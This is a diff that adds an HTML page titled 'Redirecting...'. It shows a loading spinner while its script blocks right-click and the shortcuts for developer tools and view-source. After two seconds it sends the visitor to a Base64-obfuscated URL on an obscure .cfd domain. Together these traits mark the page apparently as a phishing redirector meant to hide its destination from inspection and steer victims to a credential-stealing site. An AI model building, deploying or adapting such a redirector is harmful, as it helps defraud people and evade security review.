@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Redirecting...</title>
+
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        background: #ffffff;
+        overflow: hidden;
+    }
+
+    /* Center container */
+    .center-wrap {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: auto;
+        height: auto;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* Responsive dot spinner */
+    .dot-spinner {
+        --size: clamp(50px, 15vw, 80px);
+        width: var(--size);
+        height: var(--size);
+        position: relative;
+    }
+
+    .dot-spinner div {
+        width: calc(var(--size) * 0.17);
+        height: calc(var(--size) * 0.17);
+        background: #5659a8;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform-origin: center;
+        animation: pulse 1.2s infinite ease-in-out;
+        opacity: 0.25;
+    }
+
+    .dot-spinner div:nth-child(1) { transform: rotate(0deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0s; }
+    .dot-spinner div:nth-child(2) { transform: rotate(45deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.15s; }
+    .dot-spinner div:nth-child(3) { transform: rotate(90deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.3s; }
+    .dot-spinner div:nth-child(4) { transform: rotate(135deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.45s; }
+    .dot-spinner div:nth-child(5) { transform: rotate(180deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.6s; }
+    .dot-spinner div:nth-child(6) { transform: rotate(225deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.75s; }
+    .dot-spinner div:nth-child(7) { transform: rotate(270deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 0.9s; }
+    .dot-spinner div:nth-child(8) { transform: rotate(315deg) translate(calc(var(--size) / 2.5)) translate(-50%, -50%); animation-delay: 1.05s; }
+
+    @keyframes pulse {
+        0%, 20% { opacity: 1; }
+        50%, 100% { opacity: 0.2; }
+    }
+</style>
+
+<script>
+// Disable right click
+document.addEventListener("contextmenu", e => e.preventDefault());
+
+// Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
+document.onkeydown = function(e) {
+    if (
+        e.keyCode === 123 ||
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
+        (e.ctrlKey && e.keyCode === 85)
+    ) {
+        return false;
+    }
+};
+
+// Your Base64 link here
+const encoded = "aHR0cHM6Ly9zZWxpbi5jZmQvYXR0L2F0dA==";
+
+// Redirect after 2 seconds
+setTimeout(() => {
+    window.location.href = atob(encoded);
+}, 2000);
+</script>
+
+</head>
+
+<body>
+    <div class="center-wrap">
+        <div class="dot-spinner">
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+        </div>
+    </div>
+</body>
+</html>
